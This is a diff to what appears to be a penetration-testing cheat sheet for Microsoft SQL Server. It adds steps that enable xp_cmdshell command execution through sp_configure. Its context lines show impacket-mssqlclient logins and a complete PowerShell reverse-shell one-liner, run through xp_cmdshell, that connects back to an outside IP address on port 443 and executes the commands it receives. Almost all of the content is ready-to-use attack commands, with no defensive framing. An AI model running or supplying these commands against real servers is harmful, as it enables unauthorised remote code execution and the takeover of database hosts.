@@ -9,12 +9,21 @@ SELECT * FROM database_name.information_schema.tables;
 ### show all values of tablename from database_name
 select * from database_name.dbo.table_name;
 
+### Enable command execution
+```
+enable_xp_cmdshell;
+```
+```
+EXECUTE sp_configure 'show advanced options', 1;
+RECONFIGURE;
+EXECUTE sp_configure 'xp_cmdshell', 1;
+RECONFIGURE;
+```
+
 ### Mssql Connection and Get Reverse Sehll
 ```
 impacket-mssqlclient user:pass@IP
 impacket-mssqlclient user:pass@IP -windows-auth
-
-enable_xp_cmdshell
 
 EXEC xp_cmdshell 'powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient(''10.10.77.153'',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + ''PS '' + (pwd).Path + ''> '';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"'
 ```
